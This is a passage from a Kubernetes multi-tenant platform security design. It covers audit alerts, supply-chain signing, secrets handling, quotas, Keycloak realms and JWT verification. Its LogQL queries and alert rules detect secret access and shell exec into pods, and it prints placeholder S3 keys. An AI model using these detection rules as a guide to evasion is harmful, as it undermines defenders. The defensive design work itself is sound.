Grafana (dashboards + alerts)
  |
  |-- Dashboard: "Kubernetes Audit Log"
  |     - Who accessed secrets in the last 24h?
  |     - Who exec'd into pods?
  |     - Which namespaces had RBAC changes?
  |     - Failed authentication attempts?
  |
  |-- Alert rules:
  |     - "Secret accessed in customer namespace by non-system user" -> Slack
  |     - "RBAC ClusterRole created or modified" -> Slack + PagerDuty
  |     - "Pod exec in production namespace" -> Slack
  |     - "Namespace deleted" -> Slack
```

### Useful LogQL queries for Grafana

```logql
# Who accessed secrets in customer namespaces?
{job="kube-audit"} |= "secrets" | json | line_format "{{.verb}} {{.objectRef.namespace}}/{{.objectRef.name}} by {{.user.username}}"

# Pod exec events (someone is shelling into containers)
{job="kube-audit"} |= "pods/exec" | json | verb="create"

# Failed authentication attempts
{job="kube-audit"} | json | responseStatus_code >= 401

# All actions by a specific user (incident response)
{job="kube-audit"} | json | user_username="suspicious-user@example.com"
```

---

## Layer 6: Image Supply Chain

### The problem

If an attacker compromises your container image, none of the other layers help — you are running their code inside your cluster, with legitimate network access and database credentials.

Image supply chain security ensures that every image running in the cluster is:
1. **Scanned** for known vulnerabilities (CVEs)
2. **Signed** by our CI pipeline (not tampered with)
3. **Documented** with a Software Bill of Materials (SBOM)
4. **Up-to-date** with dependencies refreshed regularly

### Pipeline

```
Developer pushes code to GitHub
  |
  v
GitHub Actions CI pipeline
  |
  +-- Step 1: Build image
  |     docker build -t registry.stage.freezenith.com/zenith-stage/zenith-api:v1.2.3 .
  |
  +-- Step 2: Trivy vulnerability scan
  |     trivy image registry.stage.freezenith.com/zenith-stage/zenith-api:v1.2.3
  |     IF Critical/High CVE found -> FAIL pipeline, do not push
  |     IF only Low/Medium -> WARN, continue
  |
  +-- Step 3: Generate SBOM with syft
  |     syft registry.stage.freezenith.com/zenith-stage/zenith-api:v1.2.3 -o spdx-json > sbom.json
  |     (lists every package, library, and version in the image)
  |
  +-- Step 4: Push to Internal Harbor
  |     docker push registry.stage.freezenith.com/zenith-stage/zenith-api:v1.2.3
  |     (pushes to the INTERNAL registry, NOT the customer one)
  |
  +-- Step 5: Harbor server-side Trivy scan (double-check)
  |     Harbor runs Trivy again on push (in case CI was bypassed)
  |     Scan result visible in Harbor UI
  |
  +-- Step 6: Sign with cosign
  |     cosign sign --key cosign.key registry.stage.freezenith.com/zenith-stage/zenith-api:v1.2.3
  |     Signature stored as OCI artifact alongside the image
  |
  +-- Step 7: Attach SBOM to image
  |     cosign attach sbom --sbom sbom.json registry.stage.freezenith.com/zenith-stage/zenith-api:v1.2.3
  |
  +-- Step 8: Deploy (ArgoCD auto-sync or image updater)
        Kyverno validates: image is from internal Harbor? Signed? -> Allow
        Image runs in cluster
```

### Renovate for dependency updates

Renovate is a bot that automatically creates PRs when dependencies have new versions:

- Go modules (`go.mod`) — new library versions
- Node.js (`package.json`) — npm dependency updates
- Dockerfiles (`FROM` base images) — new base image versions
- Helm charts (`Chart.yaml`) — upstream chart updates

When Renovate creates a PR, CI runs Trivy. If the new dependency introduces a CVE, the PR is flagged. This keeps our supply chain fresh without manual effort.

### Harbor vulnerability policy

Both registries are configured for security scanning:

**Internal Harbor** (`registry.stage.freezenith.com`) — platform images:
- **Automatically scan** every image on push
- **Block pull** of images with Critical CVEs
- **Retain** scan results for auditing

**Customer Harbor** (`hub.stage.freezenith.com`) — pro-tier customer images:
- **Automatically scan** every image on push
- **Block pull** of images with Critical CVEs (configured per project)
- **Retain** scan results for auditing
- **Quota** per customer project (storage-limited)
- Free-tier users do NOT have access to this registry

---

## Secrets Management

### etcd Encryption at Rest

By default, Kubernetes Secrets are stored as base64 (NOT encrypted) in etcd. Anyone with etcd access can read all secrets.

k3s supports `--secrets-encryption` which encrypts secrets in etcd at rest:

```bash
# k3s server startup flag (configured via Ansible)
k3s server --secrets-encryption
```

This uses AES-CBC encryption with a key stored on the server. It protects against:
- Etcd database dump theft (backup files are encrypted)
- Disk forensics if a node is decommissioned

It does NOT protect against:
- API server compromise (secrets are decrypted when read via API)
- Node root access (the encryption key is on the same node)

For that, we combine with Sealed Secrets and strict RBAC.

### Sealed Secrets for GitOps

ArgoCD deploys everything from Git. But Secrets cannot be stored in Git (they contain passwords, API keys, etc.).

Sealed Secrets solves this:

```
1. Developer creates a regular Secret YAML (locally, not committed)
2. kubeseal encrypts it with the cluster's public key
3. The SealedSecret YAML is committed to Git (safe — only the cluster can decrypt)
4. ArgoCD applies the SealedSecret to the cluster
5. Sealed Secrets controller decrypts it into a regular Secret
6. Pods read the Secret normally
```

```
Developer workstation          Git repo              Cluster
    |                            |                     |
    |  kubeseal --cert cert.pem  |                     |
    |  < secret.yaml             |                     |
    |  > sealed-secret.yaml      |                     |
    |   (encrypted)              |                     |
    |                            |                     |
    +----> git push -----------> |                     |
                                 |                     |
                                 +---> ArgoCD sync --> |
                                                       |
                                   SealedSecret controller
                                   decrypts -> creates Secret
                                                       |
                                                    Pod reads Secret
```

### Per-Customer Database Credentials

We do NOT use a shared superuser for all customer databases. Each customer gets its own database user with access ONLY to their own database:

```sql
-- Created by Temporal provisioning workflow
CREATE USER customer_abc WITH PASSWORD 'random-32-char-password';
CREATE DATABASE customer_abc OWNER customer_abc;

-- Restrict: can only connect to their own database
REVOKE ALL ON DATABASE customer_abc FROM PUBLIC;
GRANT ALL ON DATABASE customer_abc TO customer_abc;

-- Cannot see other databases
REVOKE CONNECT ON DATABASE postgres FROM PUBLIC;
REVOKE CONNECT ON DATABASE customer_def FROM customer_abc;
```

The credentials are stored in a Kubernetes Secret in the customer's namespace. The Secret is only accessible within that namespace (RBAC + Cilium).

### Per-Customer S3 Bucket Isolation

Each customer gets their own S3 bucket with their own access keys:

```
Bucket: zenith-customer-abc-data
  Access key: AKIAIOSFODNN7EXAMPLE (unique per customer)
  Secret key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
  Policy: Only this key can access this bucket

Bucket: zenith-customer-def-data
  Access key: AKIAI2HFGHJK8EXAMPLE (different key!)
  Secret key: zKalrXTtnGBNJ/L9NEFJH/cRxTgiDZEXAMPLEKEY
  Policy: Only this key can access this bucket
```

Even if Customer ABC's credentials leak, they cannot access Customer DEF's bucket. The S3 access key has a bucket-scoped IAM policy.

---

## Resource Control

### ResourceQuota per Namespace

ResourceQuota limits the total resources a namespace can consume:

```yaml
apiVersion: v1
kind: ResourceQuota
metadata:
  name: customer-quota
  namespace: zenith-customer-abc
spec:
  hard:
    # Free tier limits
    requests.cpu: "2"            # Total CPU requests across all pods
    requests.memory: 2Gi         # Total memory requests
    limits.cpu: "4"              # Total CPU limits
    limits.memory: 4Gi           # Total memory limits
    pods: "10"                   # Max 10 pods in namespace
    services: "5"                # Max 5 services
    persistentvolumeclaims: "2"  # Max 2 PVCs
    requests.storage: 10Gi       # Max 10Gi of PVC storage
    configmaps: "20"
    secrets: "20"
```

Tier-specific quotas:

| Resource | Free | Pro | Team | Enterprise |
|----------|------|-----|------|------------|
| CPU requests | 2 | 8 | 32 | Custom |
| Memory requests | 2Gi | 16Gi | 64Gi | Custom |
| Pods | 10 | 50 | 200 | Custom |
| PVCs | 2 | 10 | 50 | Custom |
| Storage | 10Gi | 100Gi | 500Gi | Custom |

### LimitRange per Namespace

LimitRange sets defaults and maximums for individual pods/containers:

```yaml
apiVersion: v1
kind: LimitRange
metadata:
  name: customer-limits
  namespace: zenith-customer-abc
spec:
  limits:
    # Default limits applied if pod does not specify (but Kyverno requires them)
    - type: Container
      default:
        cpu: 250m
        memory: 256Mi
      defaultRequest:
        cpu: 100m
        memory: 128Mi
      max:
        cpu: "2"              # Single container cannot use more than 2 CPU
        memory: 2Gi           # Single container cannot use more than 2Gi
      min:
        cpu: 50m              # Must request at least 50m CPU
        memory: 64Mi          # Must request at least 64Mi memory
    - type: PersistentVolumeClaim
      max:
        storage: 10Gi         # Single PVC cannot be larger than 10Gi
      min:
        storage: 256Mi
```

### PriorityClasses (Eviction Order)

When a node runs out of resources, Kubernetes evicts pods. PriorityClasses determine the order:

```yaml
# System-critical (NEVER evict): kube-system pods (Cilium, CoreDNS, Traefik)
apiVersion: scheduling.k8s.io/v1
kind: PriorityClass
metadata:
  name: system-critical
value: 1000000
globalDefault: false
description: "System components that must never be evicted"

---
# Infrastructure (evict last): CNPG, Keycloak, APISIX, cert-manager
apiVersion: scheduling.k8s.io/v1
kind: PriorityClass
metadata:
  name: infrastructure
value: 500000
globalDefault: false
description: "Infrastructure services (database, identity, gateway)"

---
# Platform (evict second): zenith-api, Temporal, Harbor, monitoring
apiVersion: scheduling.k8s.io/v1
kind: PriorityClass
metadata:
  name: platform
value: 100000
globalDefault: false
description: "Zenith platform services"

---
# Customer (evict first): all customer workloads
apiVersion: scheduling.k8s.io/v1
kind: PriorityClass
metadata:
  name: customer-workload
value: 10000
globalDefault: true   # Default for pods without explicit priorityClassName
description: "Customer workloads — evicted first under resource pressure"
```

Eviction order when node is under pressure:

```
1. FIRST evicted:  customer-workload (priority: 10000)
   -> Customer pods restart. Annoying but not catastrophic.

2. THEN evicted:   platform (priority: 100000)
   -> zenith-api, monitoring down. Admin notified.

3. THEN evicted:   infrastructure (priority: 500000)
   -> Databases, identity, gateway down. CRITICAL alert.

4. NEVER evicted:  system-critical (priority: 1000000)
   -> Cilium, CoreDNS, Traefik stay running.
   -> Node can still route traffic and enforce policies.
```

---

## Identity & Authentication

### Keycloak Realm Isolation

Each customer gets their own Keycloak realm:

```
Keycloak instance (auth.freezenith.com)
  |
  |-- Realm: master (Zenith admin only, NOT used by customers)
  |
  |-- Realm: customer-abc
  |     |-- Client: customer-abc-frontend (public, PKCE)
  |     |-- Client: customer-abc-backend (confidential, service account)
  |     |-- Users: managed by customer admin
  |     |-- Roles: defined by customer
  |     |-- Identity providers: configurable by customer (Pro+)
  |     |-- Branding: customer logo and colors (Pro+)
  |
  |-- Realm: customer-def
  |     |-- (completely isolated from customer-abc)
  |     |-- Different users, roles, clients, settings
  |
  |-- Realm: customer-ghi
        |-- ...
```

**Why realm per customer and not a shared realm with groups?**

- **Token isolation:** A JWT issued for customer-abc's realm cannot be used against customer-def's API. The issuer (`iss`) and audience (`aud`) are different. APISIX verifies this.
- **Admin isolation:** Customer-abc's admin can manage their own users and roles without seeing customer-def's users.
- **Branding isolation:** Each realm can have its own login page theme.
- **Identity provider isolation:** Customer-abc can configure Google SSO. Customer-def can configure Azure AD. They do not interfere.
- **Deletion isolation:** Deleting customer-abc's realm cleanly removes everything. No orphaned users or roles.

### APISIX JWKS Verification Flow (Detailed)

```
1. User logs in via Keycloak (customer-abc realm)
   -> Keycloak issues JWT:
      {
        "iss": "https://auth.freezenith.com/realms/customer-abc",
        "sub": "user-uuid-123",
        "aud": "customer-abc-frontend",
        "exp": 1740500000,
        "realm_access": { "roles": ["admin", "editor"] },
        "kid": "abc-key-1"    (key ID in JWT header)
      }

2. Frontend sends API request:
   GET https://api.abc.freezenith.com/v1/projects
   Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIs...

3. Traefik receives request, routes to APISIX (IngressClass: apisix)

4. APISIX jwt-auth plugin:
   a. Decode JWT header -> kid = "abc-key-1"
   b. Check JWKS cache for this realm
   c. IF cache miss or kid not found:
      GET https://auth.freezenith.com/realms/customer-abc/protocol/openid-connect/certs
      Response: { "keys": [{ "kid": "abc-key-1", "kty": "RSA", "n": "...", "e": "..." }] }
      Cache for 300 seconds
   d. Find key with matching kid
   e. Verify JWT signature using RSA public key
   f. Check: exp > now (not expired)
   g. Check: iss == expected realm URL
   h. Check: aud contains expected client_id
   i. IF ALL PASS:
      Forward request to backend with headers:
        X-Consumer-ID: customer-abc
        X-Consumer-Realm: customer-abc
        X-Token-Sub: user-uuid-123
        X-Token-Roles: admin,editor
   j. IF ANY FAIL:
      Return 401 Unauthorized

5. Backend receives request:
   - Trusts X-Consumer-* headers (Cilium ensures only APISIX can reach backend)
   - Uses X-Token-Sub for authorization decisions
   - Uses X-Token-Roles for permission checks
```

---

## Security Model Diagram

```
+=========================================================================+
|                           INTERNET                                       |
+=========================================================================+
         |                                                    |
         v                                                    v
+------------------+                               +------------------+
| Cloudflare WAF   | <-- Layer 0                   | Cloudflare CDN   |
| DDoS protection  |    Edge security              | Static assets    |
| Rate limiting    |                               | (JS, CSS, images)|
+--------+---------+                               +------------------+
         |
         v
+------------------+
| Traefik          |    TLS termination
| (k3s built-in)  |    IngressRoute routing
+--------+---------+
         |
    +----+----+
    |         |
    v         v
Frontend   APISIX  <-- Layer 1: API security
(direct)   Gateway     JWT verify, CORS, rate-limit
              |
              v
+------------------+
| Cilium CNI       | <-- Layer 2: Network security
| Default deny     |    WireGuard encryption
| L7 HTTP filter   |    Hubble observability
+--------+---------+
         |
         v
+------------------+
| Pod Security +   | <-- Layer 3: Admission control
| Kyverno          |    Block bad images, enforce limits
+--------+---------+
         |
         v
+------------------+
| Customer Pod     |    Running application
+--------+---------+
         |
    monitored by
         |
         v
+------------------+
| Falco (eBPF)    | <-- Layer 4: Runtime detection
| Shell detection  |    Anomaly alerts
+--------+---------+
         |
    logs to
         |
         v
+------------------+
| Loki + Grafana   | <-- Layer 5: Audit trail
| K8s audit logs   |    Who did what, when
+------------------+

All images pass through:
+------------------+
| Harbor + Trivy   | <-- Layer 6: Supply chain
| cosign + SBOM    |    Image security
| Renovate         |
+------------------+
```

---

## Summary: What Each Layer Stops

| Attack | Layer 0 | Layer 1 | Layer 2 | Layer 3 | Layer 4 | Layer 5 | Layer 6 |
|--------|---------|---------|---------|---------|---------|---------|---------|
| DDoS flood | Blocked | - | - | - | - | - | - |
| SQL injection in URL | Blocked (WAF) | - | - | - | - | - | - |
| Stolen/forged JWT | - | Blocked | - | - | - | - | - |
| Cross-customer API call | - | Blocked (CORS + JWT realm) | Blocked (NetworkPolicy) | - | - | Logged | - |
| Pod-to-pod sniffing | - | - | Blocked (WireGuard) | - | - | - | - |
| Cross-namespace access | - | - | Blocked (default deny) | - | Detected | Logged | - |
| Privileged container | - | - | - | Blocked (PSS) | - | Logged | - |
| Unsigned image | - | - | - | Blocked (Kyverno) | - | Logged | Blocked (Harbor) |
| hostPath mount | - | - | - | Blocked (Kyverno + PSS) | - | Logged | - |
| Shell in container | - | - | - | - | Detected + alerted | Logged | - |
| Crypto miner | - | - | - | - | Detected + alerted | Logged | - |
| Secret theft via API | - | - | - | - | - | Logged (audit) | - |
| CVE in base image | - | - | - | - | - | - | Blocked (Trivy) |
| Tampered image | - | - | - | Blocked (cosign) | - | - | Blocked (Harbor) |

No single layer catches everything. Together, they form a comprehensive defense.
